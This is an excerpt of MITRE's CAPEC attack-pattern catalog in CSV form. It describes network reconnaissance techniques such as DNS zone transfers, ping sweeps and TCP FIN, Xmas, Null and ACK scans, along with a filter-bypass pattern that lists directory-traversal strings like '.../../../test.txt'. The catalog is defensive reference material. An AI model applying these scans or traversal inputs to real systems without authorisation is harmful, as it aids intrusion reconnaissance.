CAPEC-290,Enumerate Mail Exchange (MX) Records,Detailed,Stable,An adversary enumerates the MX records for a given via a DNS query. This type of information gathering returns the names of mail servers on the network. Mail servers are often not exposed to the Internet but are located within the DMZ of a network protected by a firewall. A side effect of this configuration is that enumerating the MX records for an organization my reveal the IP address of the firewall or possibly other internal systems. Attackers often resort to MX record enumeration when a DNS Zone Transfer is not possible.,N/A,N/A,Low,::NATURE:ChildOf:CAPEC ID:309::,N/A,::The adversary requires access to a DNS server that will return the MX records for a network.::,N/A,::A command-line utility or other application capable of sending requests to the DNS server is necessary.::,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::,N/A,N/A,::200::,N/A,N/A,https://capec.mitre.org/data/definitions/290.html
CAPEC-291,DNS Zone Transfers,Detailed,Stable,"An attacker exploits a DNS misconfiguration that permits a ZONE transfer. Some external DNS servers will return a list of IP address and valid hostnames. Under certain conditions, it may even be possible to obtain Zone data about the organization's internal network. When successful the attacker learns valuable information about the topology of the target organization, including information about particular servers, their role within the IT structure, and possibly information about the operating systems running upon the network. This is configuration dependent behavior so it may also be required to search out multiple DNS servers while attempting to find one with ZONE transfers allowed.",N/A,N/A,Low,::NATURE:ChildOf:CAPEC ID:309::,N/A,::Access to a DNS server that allows Zone transfers.::,N/A,::A client application capable of interacting with the DNS server or a command-line utility or web application that automates DNS interactions.::,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::,N/A,N/A,::200::,N/A,N/A,https://capec.mitre.org/data/definitions/291.html
CAPEC-292,Host Discovery,Standard,Stable,"An adversary sends a probe to an IP address to determine if the host is alive. Host discovery is one of the earliest phases of network reconnaissance. The adversary usually starts with a range of IP addresses belonging to a target network and uses various methods to determine if a host is present at that IP address. Host discovery is usually referred to as 'Ping' scanning using a sonar analogy. The goal is to send a packet through to the IP address and solicit a response from the host. As such, a 'ping' can be virtually any crafted packet whatsoever, provided the adversary can identify a functional host based on its response. An attack of this nature is usually carried out with a 'ping sweep,' where a particular kind of ping is sent to a range of IP addresses.",N/A,N/A,Low,::NATURE:ChildOf:CAPEC ID:169::,N/A,::The adversary requires logical access to the target network in order to carry out host discovery.::,N/A,::The resources required will differ based upon the type of host discovery being performed. Usually a network scanning tool or scanning script is required due to the volume of requests that must be generated.::,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::,N/A,N/A,::200::,TAXONOMY NAME:ATTACK:ENTRY ID:1018:ENTRY NAME:Remote System Discovery::,N/A,https://capec.mitre.org/data/definitions/292.html
CAPEC-293,Traceroute Route Enumeration,Detailed,Stable,"An adversary uses a traceroute utility to map out the route which data flows through the network in route to a target destination. Tracerouting can allow the adversary to construct a working topology of systems and routers by listing the systems through which data passes through on their way to the targeted machine. This attack can return varied results depending upon the type of traceroute that is performed. Traceroute works by sending packets to a target while incrementing the Time-to-Live field in the packet header. As the packet traverses each hop along its way to the destination, its TTL expires generating an ICMP diagnostic message that identifies where the packet expired. Traditional techniques for tracerouting involved the use of ICMP and UDP, but as more firewalls began to filter ingress ICMP, methods of traceroute using TCP were developed.",N/A,N/A,Low,::NATURE:ChildOf:CAPEC ID:309::,N/A,::A network capable of routing the attackers' packets to the destination network.::,N/A,::A command line version of traceroute or similar tool that performs route enumeration.::,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::,N/A,N/A,::200::,N/A,N/A,https://capec.mitre.org/data/definitions/293.html
CAPEC-294,ICMP Address Mask Request,Detailed,Stable,"An adversary sends an ICMP Type 17 Address Mask Request to gather information about a target's networking configuration. ICMP Address Mask Requests are defined by RFC-950, Internet Standard Subnetting Procedure. An Address Mask Request is an ICMP type 17 message that triggers a remote system to respond with a list of its related subnets, as well as its default gateway and broadcast address via an ICMP type 18 Address Mask Reply datagram. Gathering this type of information helps the adversary plan router-based attacks as well as denial-of-service attacks against the broadcast address.",N/A,N/A,Low,::NATURE:ChildOf:CAPEC ID:292::,N/A,"::The ability to send an ICMP type 17 query (Address Mask Request) to a remote target and receive an ICMP type 18 message (ICMP Address Mask Reply) in response. Generally, modern operating systems will ignore ICMP type 17 messages, however, routers will commonly respond to this request.::",N/A,::The ability to send custom ICMP queries. This can be accomplished via the use of various scanners or utilities.::,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Hide Activities::,N/A,N/A,::200::,N/A,N/A,https://capec.mitre.org/data/definitions/294.html
CAPEC-295,Timestamp Request,Detailed,Stable,"This pattern of attack leverages standard requests to learn the exact time associated with a target system. An adversary may be able to use the timestamp returned from the target to attack time-based security algorithms, such as random number generators, or time-based authentication mechanisms.",N/A,N/A,Low,::NATURE:ChildOf:CAPEC ID:292::,N/A,::The ability to send a timestamp request to a remote target and receive a response.::,N/A,::Scanners or utilities that provide the ability to send custom ICMP queries.::,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::,N/A,"::An adversary sends an ICMP type 13 Timestamp Request to determine the time as recorded by a remote target. Timestamp Replies, ICMP Type 14, usually return a value in Greenwich Mean Time. An adversary can attempt to use an ICMP Timestamp requests to 'ping' a remote system to see if is alive. Additionally, because these types of messages are rare they are easily spotted by intrusion detection systems, many ICMP scanning tools support IP spoofing to help conceal the origin of the actual request among a storm of similar ICMP messages. It is a common practice for border firewalls and gateways to be configured to block ingress ICMP type 13 and egress ICMP type 14 messages.::An adversary may gather the system time or time zone from a local or remote system. This information may be gathered in a number of ways, such as with Net on Windows by performing net time hostname to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using w32tm /tz. The information could be useful for performing other techniques, such as executing a file with a Scheduled Task, or to discover locality information based on time zone to assist in victim targeting::",::200::,TAXONOMY NAME:ATTACK:ENTRY ID:1124:ENTRY NAME:System Time Discovery::,N/A,https://capec.mitre.org/data/definitions/295.html
CAPEC-296,ICMP Information Request,Detailed,Stable,"An adversary sends an ICMP Information Request to a host to determine if it will respond to this deprecated mechanism. ICMP Information Requests are a deprecated message type. Information Requests were originally used for diskless machines to automatically obtain their network configuration, but this message type has been superseded by more robust protocol implementations like DHCP.",N/A,N/A,Low,::NATURE:ChildOf:CAPEC ID:292::,N/A,::The ability to send an ICMP Type 15 Information Request and receive an ICMP Type 16 Information Reply in response.::,::SKILL:The adversary needs to know certain linux commands for this type of attack.:LEVEL:Low::,::Scanners or utilities that provide the ability to send custom ICMP queries.::,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::,N/A,N/A,::200::,N/A,N/A,https://capec.mitre.org/data/definitions/296.html
CAPEC-297,TCP ACK Ping,Detailed,Stable,"An adversary sends a TCP segment with the ACK flag set to a remote host for the purpose of determining if the host is alive. This is one of several TCP 'ping' types. The RFC 793 expected behavior for a service is to respond with a RST 'reset' packet to any unsolicited ACK segment that is not part of an existing connection. So by sending an ACK segment to a port, the adversary can identify that the host is alive by looking for a RST packet. Typically, a remote server will respond with a RST regardless of whether a port is open or closed. In this way, TCP ACK pings cannot discover the state of a remote port because the behavior is the same in either case. The firewall will look up the ACK packet in its state-table and discard the segment because it does not correspond to any active connection. A TCP ACK Ping can be used to discover if a host is alive via RST response packets sent from the host.",N/A,N/A,Low,::NATURE:ChildOf:CAPEC ID:292::,N/A,"::The ability to send an ACK packet to a remote host and identify the response. Creating the ACK packet without building a full connection requires the use of raw sockets. As a result, it is not possible to send a TCP ACK ping from some systems (Windows XP SP 2) without the use of third-party packet drivers like Winpcap. On other systems (BSD, Linux) administrative privileges are required in order to write to the raw socket.::The target must employ a stateless firewall that lacks a rule set that rejects unsolicited ACK packets.::The adversary requires the ability to craft custom TCP ACK segments for use during network reconnaissance. Sending an ACK ping requires the ability to access raw sockets in order to create the packets with direct access to the packet header.::",N/A,::ACK scanning can be performed via the use of a port scanner or by raw socket manipulation using a scripting or programming language. Packet injection tools are also useful for this purpose. Depending upon the technique used it may also be necessary to sniff the network in order to see the response.::,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::,::Leverage stateful firewalls that allow for the rejection of a packet that is not part of an existing connection.::,N/A,::200::,N/A,N/A,https://capec.mitre.org/data/definitions/297.html
CAPEC-298,UDP Ping,Detailed,Stable,"An adversary sends a UDP datagram to the remote host to determine if the host is alive. If a UDP datagram is sent to an open UDP port there is very often no response, so a typical strategy for using a UDP ping is to send the datagram to a random high port on the target. The goal is to solicit an 'ICMP port unreachable' message from the target, indicating that the host is alive. UDP pings are useful because some firewalls are not configured to block UDP datagrams sent to strange or typically unused ports, like ports in the 65K range. Additionally, while some firewalls may filter incoming ICMP, weaknesses in firewall rule-sets may allow certain types of ICMP (host unreachable, port unreachable) which are useful for UDP ping attempts.",N/A,N/A,Low,::NATURE:ChildOf:CAPEC ID:292::,N/A,::The adversary requires the ability to send a UDP datagram to a remote host and receive a response.::The adversary requires the ability to craft custom UDP Packets for use during network reconnaissance.::The target's firewall must not be configured to block egress ICMP messages.::,N/A,::UDP pings can be performed via the use of a port scanner or by raw socket manipulation using a scripting or programming language. Packet injection tools are also useful for this purpose. Depending upon the technique used it may also be necessary to sniff the network in order to see the response.::,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::,::Configure your firewall to block egress ICMP messages.::,N/A,::200::,N/A,N/A,https://capec.mitre.org/data/definitions/298.html
CAPEC-299,TCP SYN Ping,Detailed,Stable,"An adversary uses TCP SYN packets as a means towards host discovery. Typical RFC 793 behavior specifies that when a TCP port is open, a host must respond to an incoming SYN synchronize packet by completing stage two of the 'three-way handshake' - by sending an SYN/ACK in response. When a port is closed, RFC 793 behavior is to respond with a RST reset packet. This behavior can be used to 'ping' a target to see if it is alive by sending a TCP SYN packet to a port and then looking for a RST or an ACK packet in response.",N/A,N/A,Low,::NATURE:ChildOf:CAPEC ID:292::,N/A,"::The ability to send a TCP SYN packet to a remote target. Depending upon the operating system, the ability to craft SYN packets may require elevated privileges.::",::SKILL:The adversary needs to know how to craft and send protocol commands from the command line or within a tool.:LEVEL:Low::,::SYN pings can be performed via the use of a port scanner or by raw socket manipulation using a scripting or programming language. Packet injection tools are also useful for this purpose. Depending upon the technique used it may also be necessary to sniff the network in order to see the response.::,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::,N/A,N/A,::200::,N/A,N/A,https://capec.mitre.org/data/definitions/299.html
CAPEC-3,Using Leading 'Ghost' Character Sequences to Bypass Input Filters,Detailed,Draft,"Some APIs will strip certain leading characters from a string of parameters. An adversary can intentionally introduce leading ghost characters (extra characters that don't affect the validity of the request at the API layer) that enable the input to pass the filters and therefore process the adversary's input. This occurs when the targeted API will accept input data in several syntactic forms and interpret it in the equivalent semantic way, while the filter does not take into account the full spectrum of the syntactic forms acceptable to the targeted API.",N/A,Medium,Medium,::NATURE:ChildOf:CAPEC ID:267::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for user-controllable inputs] Using a browser, an automated tool or by inspecting the application, an adversary records all entry points to the application.TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.:TECHNIQUE:Manually inspect the application to find entry points.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe entry points to locate vulnerabilities] The adversary uses the entry points gathered in the Explore phase as a target list and injects various leading 'Ghost' character sequences to determine how to application filters them.TECHNIQUE:Add additional characters to common sequences such as ../ to see how the application will filter them.:TECHNIQUE:Try repeating special characters (?, @, #, *, etc.) at the beginning of user input to see how the application filters these out.::STEP:3:PHASE:Exploit:DESCRIPTION:[Bypass input filtering] Using what the adversary learned about how the application filters input data, they craft specific input data that bypasses the filter. This can lead to directory traversal attacks, arbitrary shell command execution, corruption of files, etc.::",::The targeted API must ignore the leading ghost characters that are used to get past the filters for the semantics to be the same.::,"::SKILL:The ability to make an API request, and knowledge of ghost characters that will not be filtered by any input validation. These ghost characters must be known to not affect the way in which the request will be interpreted.:LEVEL:Medium::",N/A,N/A,::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::,::Use an allowlist rather than a denylist input validation.::Canonicalize all data prior to validation.::Take an iterative approach to input validation (defense in depth).::,"::Alternate Encoding with Ghost Characters in FTP and Web Servers Some web and FTP servers fail to detect prohibited upward directory traversals if the user-supplied pathname contains extra characters such as an extra leading dot. For example, a program that will disallow access to the pathname ../test.txt may erroneously allow access to that file if the pathname is specified as .../test.txt. This attack succeeds because 1) the input validation logic fails to detect the triple-dot as a directory traversal attempt (since it isn't dot-dot), 2) some part of the input processing decided to strip off the extra dot, leaving the dot-dot behind. Using the file system API as the target, the following strings are all equivalent to many programs: .../../../test.txt............/../../test.txt..?/../../test.txt..????????/../../test.txt../test.txt As you can see, there are many ways to make a semantically equivalent request. All these strings ultimately result in a request for the file ../test.txt.::",::173::41::172::179::180::181::183::184::20::74::697::707::,N/A,N/A,https://capec.mitre.org/data/definitions/3.html
CAPEC-300,Port Scanning,Standard,Stable,An adversary uses a combination of techniques to determine the state of the ports on a remote target. Any service or application available for TCP or UDP networking will have a port open for communications over the network.,N/A,N/A,Low,::NATURE:ChildOf:CAPEC ID:169::,N/A,::The adversary requires logical access to the target's network in order to carry out this type of attack.::,N/A,"::The adversary requires a network mapping/scanning tool, or must conduct socket programming on the command line. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.::",N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::,N/A,N/A,::200::,TAXONOMY NAME:ATTACK:ENTRY ID:1046:ENTRY NAME:Network Service Scanning::,"TYPE:Other:NOTE:There are four types of port status that this type of attack aims to identify: 1) Open Port: The port is open and a firewall does not block access to the port, 2) Closed Port: The port is closed (i.e. no service resides there) and a firewall does not block access to the port, 3) Filtered Port: A firewall or ACL rule is blocking access to the port in some manner, although the presence of a listening service on the port cannot be verified, and 4) Unfiltered Port: A firewall or ACL rule is not blocking access to the port, although the presence of a listening service on the port cannot be verified.::",https://capec.mitre.org/data/definitions/300.html
CAPEC-301,TCP Connect Scan,Detailed,Stable,"An adversary uses full TCP connection attempts to determine if a port is open on the target system. The scanning process involves completing a 'three-way handshake' with a remote port, and reports the port as closed if the full handshake cannot be established. An advantage of TCP connect scanning is that it works against any TCP/IP stack.",N/A,N/A,Low,::NATURE:ChildOf:CAPEC ID:300::,::STEP:1:PHASE:Experiment:DESCRIPTION:An adversary attempts to initialize a TCP connection with with the target port.::STEP:2:PHASE:Experiment:DESCRIPTION:An adversary uses the result of their TCP connection to determine the state of the target port. A successful connection indicates a port is open with a service listening on it while a failed connection indicates the port is not open.::,::The adversary requires logical access to the target network. The TCP connect Scan requires the ability to connect to an available port and complete a 'three-way-handshake' This scanning technique does not require any special privileges in order to perform. This type of scan works against all TCP/IP stack implementations.::,N/A,"::The adversary can leverage a network mapper or scanner, or perform this attack via routine socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network to see the response.::",N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::,::Employ a robust network defense posture that includes an IDS/IPS system.::,N/A,::200::,N/A,N/A,https://capec.mitre.org/data/definitions/301.html
CAPEC-302,TCP FIN Scan,Detailed,Stable,"An adversary uses a TCP FIN scan to determine if ports are closed on the target machine. This scan type is accomplished by sending TCP segments with the FIN bit set in the packet header. The RFC 793 expected behavior is that any TCP segment with an out-of-state Flag sent to an open port is discarded, whereas segments with out-of-state flags sent to closed ports should be handled with a RST in response. This behavior should allow the adversary to scan for closed ports by sending certain types of rule-breaking packets (out of sync or disallowed by the TCB) and detect closed ports via RST packets.",N/A,N/A,Low,::NATURE:ChildOf:CAPEC ID:300::,::STEP:1:PHASE:Experiment:DESCRIPTION:An adversary sends TCP packets with the FIN flag but not associated with an existing connection to target ports.::STEP:2:PHASE:Experiment:DESCRIPTION:An adversary uses the response from the target to determine the port's state. If no response is received the port is open. If a RST packet is received then the port is closed.::,"::FIN scanning requires the use of raw sockets, and thus cannot be performed from some Windows systems (Windows XP SP 2, for example). On Unix and Linux, raw socket manipulations require root privileges.::",N/A,"::This attack pattern requires the ability to send TCP FIN segments to a host during network reconnaissance. This can be achieved via the use of a network mapper or scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.::",N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::,"::FIN scans are detected via heuristic (non-signature) based algorithms, much in the same way as other scan types are detected. An IDS/IPS system with heuristic algorithms is required to detect them.::",N/A,::200::,N/A,"TYPE:Other:NOTE:Many operating systems, however, do not implement RFC 793 exactly and for this reason FIN scans do not work as expected against these devices. Some operating systems, like Microsoft Windows, send a RST packet in response to any out-of-sync (or malformed) TCP segments received by a listening socket (rather than dropping the packet via RFC 793), thus preventing an attacker from distinguishing between open and closed ports. FIN scans are limited by the range of platforms against which they work. Additionally, because open ports are inferred via no responses being generated, one cannot distinguish an open port from a filtered port without further analysis. For instance, FIN scanning a system protected by a stateful firewall may indicate all ports being open. For these reasons, FIN scanning results must always be interpreted as part of a larger scanning strategy.::",https://capec.mitre.org/data/definitions/302.html
CAPEC-303,TCP Xmas Scan,Detailed,Stable,"An adversary uses a TCP XMAS scan to determine if ports are closed on the target machine. This scan type is accomplished by sending TCP segments with all possible flags set in the packet header, generating packets that are illegal based on RFC 793. The RFC 793 expected behavior is that any TCP segment with an out-of-state Flag sent to an open port is discarded, whereas segments with out-of-state flags sent to closed ports should be handled with a RST in response. This behavior should allow an attacker to scan for closed ports by sending certain types of rule-breaking packets (out of sync or disallowed by the TCB) and detect closed ports via RST packets.",N/A,N/A,Low,::NATURE:ChildOf:CAPEC ID:300::,::STEP:1:PHASE:Experiment:DESCRIPTION:An adversary sends TCP packets with all flags set but not associated with an existing connection to target ports.::STEP:2:PHASE:Experiment:DESCRIPTION:An adversary uses the response from the target to determine the port's state. If no response is received the port is open. If a RST packet is received then the port is closed.::,"::The adversary needs logical access to the target network. XMAS scanning requires the use of raw sockets, and thus cannot be performed from some Windows systems (Windows XP SP 2, for example). On Unix and Linux, raw socket manipulations require root privileges.::",N/A,"::This attack can be carried out with a network mapper or scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.::",N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::,::Employ a robust network defensive posture that includes a managed IDS/IPS.::,N/A,::200::,N/A,"TYPE:Other:NOTE:Many operating systems do not implement RFC 793 exactly and for this reason XMAS scans do not work as expected against these devices. Some operating systems, like Microsoft Windows, send a RST packet in response to any out-of-sync (or malformed) TCP segments received by a listening socket (rather than dropping the packet via RFC 793), thus preventing the adversary from distinguishing between open and closed ports. XMAS scans are limited by the range of platforms against which they work.::",https://capec.mitre.org/data/definitions/303.html
CAPEC-304,TCP Null Scan,Detailed,Stable,"An adversary uses a TCP NULL scan to determine if ports are closed on the target machine. This scan type is accomplished by sending TCP segments with no flags in the packet header, generating packets that are illegal based on RFC 793. The RFC 793 expected behavior is that any TCP segment with an out-of-state Flag sent to an open port is discarded, whereas segments with out-of-state flags sent to closed ports should be handled with a RST in response. This behavior should allow an attacker to scan for closed ports by sending certain types of rule-breaking packets (out of sync or disallowed by the TCB) and detect closed ports via RST packets.",N/A,N/A,Low,::NATURE:ChildOf:CAPEC ID:300::,::STEP:1:PHASE:Experiment:DESCRIPTION:An adversary sends TCP packets with no flags set and that are not associated with an existing connection to target ports.::STEP:2:PHASE:Experiment:DESCRIPTION:An adversary uses the response from the target to determine the port's state. If no response is received the port is open. If a RST packet is received then the port is closed.::,"::The adversary requires logical access to the target network. NULL scanning requires the use of raw sockets, and thus cannot be performed from some Windows systems (Windows XP SP 2, for example). On Unix and Linux, raw socket manipulations require root privileges.::",N/A,"::This attack can be carried out via a network mapper/scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.::",N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::,::Employ a robust network defensive posture that includes a managed IDS/IPS.::,N/A,::200::,N/A,"TYPE:Other:NOTE:Many operating systems do not implement RFC 793 exactly and for this reason NULL scans do not work as expected against these devices. Some operating systems, like Microsoft Windows, send a RST packet in response to any out-of-sync (or malformed) TCP segments received by a listening socket (rather than dropping the packet via RFC 793), thus preventing the adversary from distinguishing between open and closed ports. NULL scans are limited by the range of platforms against which they work.::",https://capec.mitre.org/data/definitions/304.html
CAPEC-305,TCP ACK Scan,Detailed,Stable,"An adversary uses TCP ACK segments to gather information about firewall or ACL configuration. The purpose of this type of scan is to discover information about filter configurations rather than port state. This type of scanning is rarely useful alone, but when combined with SYN scanning, gives a more complete picture of the type of firewall rules that are present.",N/A,N/A,Low,::NATURE:ChildOf:CAPEC ID:300::,"::STEP:1:PHASE:Experiment:DESCRIPTION:An adversary sends TCP packets with the ACK flag set and that are not associated with an existing connection to target ports.::STEP:2:PHASE:Experiment:DESCRIPTION:An adversary uses the response from the target to determine the port's state. If a RST packet is received the target port is either closed or the ACK was sent out-of-sync. If no response is received, the target is likely using a stateful firewall.::","::The adversary requires logical access to the target network. ACK scanning requires the use of raw sockets, and thus cannot be performed from some Windows systems (Windows XP SP 2, for example). On Unix and Linux, raw socket manipulations require root privileges.::",N/A,"::This attack can be achieved via the use of a network mapper or scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.::",N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::,N/A,N/A,::200::,N/A,"TYPE:Other:NOTE:If a SYN solicits a SYN/ACK or a RST and an ACK solicits a RST, the port is unfiltered by any firewall type. If a SYN solicits a SYN/ACK, but an ACK generates no response, the port is statefully filtered. When a SYN generates neither a SYN/ACK or a RST, but an ACK generates a RST, the port is statefully filtered. When neither SYN nor ACK generates any response, the port is blocked by a specific firewall rule, which can occur via any type of firewall.::",https://capec.mitre.org/data/definitions/305.html
CAPEC-306,TCP Window Scan,Detailed,Stable,"An adversary engages in TCP Window scanning to analyze port status and operating system type. TCP Window scanning uses the ACK scanning method but examine the TCP Window Size field of response RST packets to make certain inferences. While TCP Window Scans are fast and relatively stealthy, they work against fewer TCP stack implementations than any other type of scan. Some operating systems return a positive TCP window size when a RST packet is sent from an open port, and a negative value when the RST originates from a closed port. TCP Window scanning is one of the most complex scan types, and its results are difficult to interpret. Window scanning alone rarely yields useful information, but when combined with other types of scanning is more useful. It is a generally more reliable means of making inference about operating system versions than port status.",N/A,N/A,Low,::NATURE:ChildOf:CAPEC ID:300::,"::STEP:1:PHASE:Experiment:DESCRIPTION:An adversary sends TCP packets with the ACK flag set and that are not associated with an existing connection to target ports.::STEP:2:PHASE:Experiment:DESCRIPTION:An adversary uses the response from the target to determine the port's state. Specifically, the adversary views the TCP window size from the returned RST packet if one was received. Depending on the target operating system, a positive window size may indicate an open port while a negative window size may indicate a closed port.::","::TCP Window scanning requires the use of raw sockets, and thus cannot be performed from some Windows systems (Windows XP SP 2, for example). On Unix and Linux, raw socket manipulations require root privileges.::",N/A,"::The ability to send TCP segments with a custom window size to a host during network reconnaissance. This can be achieved via the use of a network mapper or scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.::",N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::,N/A,N/A,::200::,N/A,N/A,https://capec.mitre.org/data/definitions/306.html
CAPEC-307,TCP RPC Scan,Detailed,Stable,An adversary scans for RPC services listing on a Unix/Linux host.,N/A,N/A,Low,::NATURE:ChildOf:CAPEC ID:300::,"::STEP:1:PHASE:Experiment:DESCRIPTION:An adversary sends RCP packets to target ports.::STEP:2:PHASE:Experiment:DESCRIPTION:An adversary uses the response from the target to determine which, if any, RPC service is running on that port. Responses will vary based on which RPC service is running.::",::RPC scanning requires no special privileges when it is performed via a native system utility.::,N/A,::The ability to craft custom RPC datagrams for use during network reconnaissance via native OS utilities or a port scanning tool. By tailoring the bytes injected one can scan for specific RPC-registered services. Depending upon the method used it may be necessary to sniff the network in order to see the response.::,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::,"::Typically, an IDS/IPS system is very effective against this type of attack.::",N/A,::200::,N/A,N/A,https://capec.mitre.org/data/definitions/307.html
CAPEC-308,UDP Scan,Detailed,Stable,An adversary engages in UDP scanning to gather information about UDP port status on the target system. UDP scanning methods involve sending a UDP datagram to the target port and looking for evidence that the port is closed. Open UDP ports usually do not respond to UDP datagrams as there is no stateful mechanism within the protocol that requires building or establishing a session. Responses to UDP datagrams are therefore application specific and cannot be relied upon as a method of detecting an open port. UDP scanning relies heavily upon ICMP diagnostic messages in order to determine the status of a remote port.,N/A,N/A,Low,::NATURE:ChildOf:CAPEC ID:300::,::STEP:1:PHASE:Experiment:DESCRIPTION:An adversary sends UDP packets to target ports.::STEP:2:PHASE:Experiment:DESCRIPTION:An adversary uses the response from the target to determine the port's state. Whether a port responds to a UDP packet is dependant on what application is listening on that port. No response does not indicate the port is not open.::,"::The ability to send UDP datagrams to a host and receive ICMP error messages from that host. In cases where particular types of ICMP messaging is disallowed, the reliability of UDP scanning drops off sharply.::",N/A,"::The ability to craft custom UDP Packets for use during network reconnaissance. This can be accomplished via the use of a port scanner, or via socket manipulation in a programming or scripting language. Packet injection tools are also useful. It is also necessary to trap ICMP diagnostic messages during this process. Depending upon the method used it may be necessary to sniff the network in order to see the response.::",N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::,::Firewalls or ACLs which block egress ICMP error types effectively prevent UDP scans from returning any useful information.::UDP scanning is complicated by rate limiting mechanisms governing ICMP error messages.::,N/A,::200::,N/A,N/A,https://capec.mitre.org/data/definitions/308.html
CAPEC-309,Network Topology Mapping,Standard,Draft,"An adversary engages in scanning activities to map network nodes, hosts, devices, and routes. Adversaries usually perform this type of network reconnaissance during the early stages of attack against an external network. Many types of scanning utilities are typically employed, including ICMP tools, network mappers, port scanners, and route testing utilities such as traceroute.",N/A,N/A,Low,::NATURE:ChildOf:CAPEC ID:169::NATURE:CanPrecede:CAPEC ID:664::,N/A,::None::,N/A,"::Probing requires the ability to interactively send and receive data from a target, whereas passive listening requires a sufficient understanding of the protocol to analyze a preexisting channel of communication.::",N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::,N/A,N/A,::200::,TAXONOMY NAME:ATTACK:ENTRY ID:1016:ENTRY NAME:System Network Configuration Discovery::,N/A,https://capec.mitre.org/data/definitions/309.html
